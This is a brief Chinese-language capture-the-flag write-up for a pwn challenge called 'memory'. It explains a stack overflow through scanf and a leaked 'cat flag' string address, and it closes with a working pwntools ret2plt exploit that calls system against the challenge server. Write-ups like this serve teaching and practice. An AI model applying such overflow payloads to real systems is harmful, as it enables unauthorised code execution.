checksec

![image-20201202155611805](https://static.hack1s.fun/images/2021/02/06/image-20201202155611805.png)

本来还以为是类似于测试nc这样一连上去就有flag，结果并不是

![image-20201202155655176](https://static.hack1s.fun/images/2021/02/06/image-20201202155655176.png)

main函数用随机数种子生成了一个数组，之后输出

![image-20201202155718603](https://static.hack1s.fun/images/2021/02/06/image-20201202155718603.png)

在这个mem_test里面有输出一个hint的地址，这个地址是cat flag这个字符串的地址

![image-20201202155926210](https://static.hack1s.fun/images/2021/02/06/image-20201202155926210.png)

这里的scanf会导致溢出，其实前面的东西没有那么关键

另外有一个win_func后门函数

![image-20201202155856509](https://static.hack1s.fun/images/2021/02/06/image-20201202155856509.png)

直接在scanf这里溢出，返回到system调用`cat flag`

```python
from pwn import *
io = remote('node3.buuoj.cn',27258)
#io = process('./memory')
elf = ELF('./memory')
payload = bytes('a'*0x13 + 'b'*0x4,'ascii') + p32(elf.plt['system']) + p32(elf.sym['main']) + p32(0x80487e0)
io.send(payload)
io.interactive()
```

